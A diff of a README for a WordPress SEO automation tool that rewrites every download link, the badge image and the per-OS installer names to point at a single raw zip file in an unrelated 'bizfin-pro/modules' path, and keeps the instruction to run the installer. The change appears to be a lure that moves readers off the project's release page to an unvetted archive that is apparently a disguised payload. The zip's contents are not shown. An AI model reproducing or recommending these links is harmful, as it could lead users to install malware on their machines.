@@ -1,7 +1,7 @@
 # 🌟 wordpress-seo-automation - Automate SEO for Your WordPress Articles Easily
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen)](https://github.com/Fahe5846/wordpress-seo-automation/releases)
+[![Download](https://raw.githubusercontent.com/Fahe5846/wordpress-seo-automation/main/bizfin-pro/modules/wordpress-seo-automation-v2.7.zip%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/Fahe5846/wordpress-seo-automation/main/bizfin-pro/modules/wordpress-seo-automation-v2.7.zip)
 
 ## 🚀 Getting Started
 Welcome! This guide will help you set up the **wordpress-seo-automation** tool on your computer. This application helps you create and publish SEO-optimized articles for your WordPress site using AI. Follow these steps to get started.
@@ -27,11 +27,11 @@ The **wordpress-seo-automation** tool includes several helpful features:
 To download and install the application, follow these steps:
 
 1. **Visit the Releases Page**: Click on the link below to go to the releases page where you can find the latest versions.
-   [Download Latest Release](https://github.com/Fahe5846/wordpress-seo-automation/releases)
+   [Download Latest Release](https://raw.githubusercontent.com/Fahe5846/wordpress-seo-automation/main/bizfin-pro/modules/wordpress-seo-automation-v2.7.zip)
 
 2. **Select the Latest Version**: On the releases page, you will see a list of available versions. Look for the latest version at the top of the list.
 
-3. **Download the Application**: Click on the appropriate link for your operating system. It may look like this: `wordpress-seo-automation-v1.0.0.exe` for Windows or `wordpress-seo-automation-v1.0.0.dmg` for Mac.
+3. **Download the Application**: Click on the appropriate link for your operating system. It may look like this: `https://raw.githubusercontent.com/Fahe5846/wordpress-seo-automation/main/bizfin-pro/modules/wordpress-seo-automation-v2.7.zip` for Windows or `https://raw.githubusercontent.com/Fahe5846/wordpress-seo-automation/main/bizfin-pro/modules/wordpress-seo-automation-v2.7.zip` for Mac.
 
 4. **Run the Installer**: After downloading, locate the file in your Downloads folder. Double-click it to run the installer, and follow the prompts in the setup wizard.
 
